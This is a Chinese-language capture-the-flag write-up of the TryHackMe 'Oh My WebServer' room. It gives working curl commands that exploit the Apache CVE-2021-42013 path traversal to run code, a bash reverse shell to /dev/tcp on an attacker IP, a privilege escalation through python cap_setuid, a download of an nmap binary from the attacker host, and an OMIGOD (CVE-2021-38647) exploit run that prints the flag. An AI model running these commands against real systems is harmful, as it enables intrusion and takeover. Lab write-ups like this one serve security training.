# Oh My WebServer

循例，nmap扫一波

发现只开22和80

开burp进80的web看一眼，顺便gobuster扫一波

web好像没啥东西，但是gobuster扫到了一个熟悉的目录 /cgi-bin

虽然我对这个目录不了解，但cgi这个名字还是了解过的，所以我觉得这肯定有东西，于是去百度搜一下资料

果然，CVE-2021-42013

仅适用于apache2.4.49和2.4.50

根据一番了解过后，构造：

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">curl</font> <font color="#FEA44C">&apos;http://10.10.95.75/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash&apos;</font> <font color="#9755B3">-H</font> <font color="#FEA44C">&apos;Content-Type: text/plain&apos;</font> <font color="#9755B3">-d</font> <font color="#FEA44C">&apos;echo; whoami&apos;</font>                
daemon
                                     </pre>

我们目录穿越到/bin/bash，作为我们的处理程序，我们的data就会被传入bash处理


---

reverse shell:

<pre><font color="#367BF0">──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">curl</font> <font color="#FEA44C">&apos;http://10.10.95.75/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash&apos;</font> <font color="#9755B3">-H</font> <font color="#FEA44C">&apos;Content-Type: text/plain&apos;</font> <font color="#9755B3">-d</font> <font color="#FEA44C">&apos;echo; whoami &amp;&amp; bash -i &gt;&amp; /dev/tcp/10.11.17.14/8888 0&gt;&amp;1&apos;</font>
</pre>


get到shell之后也是传统手艺信息收集

结果看到了惊喜：

<pre>daemon@4a70924bafa0:/bin$ getcap -r / 2&gt;/dev/null
/usr/bin/python3.7 = cap_setuid+ep
</pre>

成功提权root

<pre>daemon@4a70924bafa0:/bin$ /usr/bin/python3.7 -c &quot;import os;os.setuid(0);os.system(&apos;/bin/bash&apos;)&quot;       
root@4a70924bafa0:/bin# whoami
root
</pre>

但是只有user.txt，没有root.txt

继续找，然后没办法，一些命令也被删除了，去看了一下别人的做法

怀疑内网存在其他设备或者docker

然后把nmap传进去扫一下内网

nmap可执行文件：https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap

庆幸的是curl命令没有被删除

    root@4a70924bafa0:/# curl http://10.11.17.14:8000/nmap -o /nmap


赋予执行权限：

    root@4a70924bafa0:/# chmod 777 /nmap

运行nmap arp扫内网网段存活主机

    root@4a70924bafa0:/# /nmap -PR 172.17.0.0/16

<pre>Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.00057s latency).
Not shown: 1205 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</pre>

使用端口扫描再看看有没有开其他端口

    root@4a70924bafa0:/# /nmap -sS -p- 172.17.0.1

不是一般的慢，我选择-p 0-10000

看到5986端口开放，百度看一下是:

    WinRM,windows远程桌面管理服务

由于我目前对windows不熟，只好找找有没有能用的cve和exp

[CVE-2021-38647](https://github.com/AlteredSecurity/CVE-2021-38647) exploit

将exp传到shell并运行

    root@4a70924bafa0:/# python3 /exp.py -t 172.17.0.1 -p 5986 -c id

    uid=0(root) gid=0(root) groups=0(root)

.

    root@4a70924bafa0:/# python3 /exp.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"         
                 
    THM{7f147ef1f36da9ae29529890a1b6011f}

